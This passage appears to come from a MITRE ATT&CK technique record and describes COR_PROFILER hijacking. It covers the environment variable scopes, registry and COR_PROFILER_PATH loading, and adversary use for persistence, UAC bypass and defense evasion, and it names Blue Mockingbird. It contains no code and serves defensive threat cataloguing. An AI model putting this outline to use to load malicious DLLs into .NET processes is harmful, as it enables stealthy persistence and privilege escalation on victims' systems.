CLR.^[[1]](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview)^^[[2]](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100))^\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.^[[2]](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100))^\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.^[[3]](https://redcanary.com/blog/blue-mockingbird-cryptominer/)^^[[4]](https://redcanary.com/blog/cor_profiler-for-persistence/)^^[[5]](https://offsec.almond.consulting/UAC-bypass-dotnet.html)^^[[6]](https://github.com/OmerYa/Invisi-Shell)^^[[7]](https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html)^","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":["Blue Mockingbird"]}}}